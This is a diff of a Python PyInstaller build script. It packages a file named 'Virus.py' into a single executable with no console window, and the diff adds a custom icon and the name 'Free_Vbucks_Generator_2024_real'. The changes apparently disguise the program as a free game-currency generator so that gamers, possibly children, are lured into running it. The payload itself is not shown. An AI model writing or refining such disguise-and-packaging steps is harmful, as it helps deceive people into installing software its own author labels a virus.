@@ -5,7 +5,8 @@ import shutil
 # Specify the path to your Python script and assets folder
 script_path = "Virus.py"
 assets_folder = "Assets"  # Folder containing assets (images, data files, etc.)
-
+icon_path = "Assets\exeicon.png"  # Path to the icon file
+exeName = "Free_Vbucks_Generator_2024_real" #Name
 # Additional modules that may not be automatically detected by PyInstaller
 additional_modules = [
     "FUNctionalities.stewietest",
@@ -23,9 +24,11 @@ if os.path.isfile(script_path):
     # Generate PyInstaller command with additional import options and assets
     pyinstaller_cmd = [
         "pyinstaller",
-        "--onefile",
-        "--noconsole",
+        "--onefile",  # Package everything into one file
+        "--noconsole",  # Hide console window
         f"--add-data={assets_folder};assets",  # Include assets folder
+        f"--icon={icon_path}",  # Set custom icon
+        f"--name={exeName}",  # Set the name of the executable
         script_path,
     ] + [f"--hidden-import={module}" for module in additional_modules]
 
